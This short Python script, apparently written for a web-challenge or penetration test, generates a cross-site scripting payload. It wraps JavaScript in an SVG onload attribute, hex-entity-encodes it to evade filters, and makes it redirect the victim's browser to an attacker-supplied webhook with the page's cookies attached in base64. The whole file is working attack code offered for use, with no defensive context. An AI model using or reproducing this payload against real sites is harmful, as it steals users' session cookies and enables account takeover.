import html
import sys
webhoook = sys.argv[1]
payload = "location.href='%s?c='+btoa(document.cookie)" % webhoook
# payload = "alert(1)"
def my_encode(s):
    res = ""
    for c in s:
        res += "&#%s;" % ("x" + str(hex(ord(c)))[2:].upper())
    return res

full = "<svg/onload=%s>" % my_encode(payload)

print(full)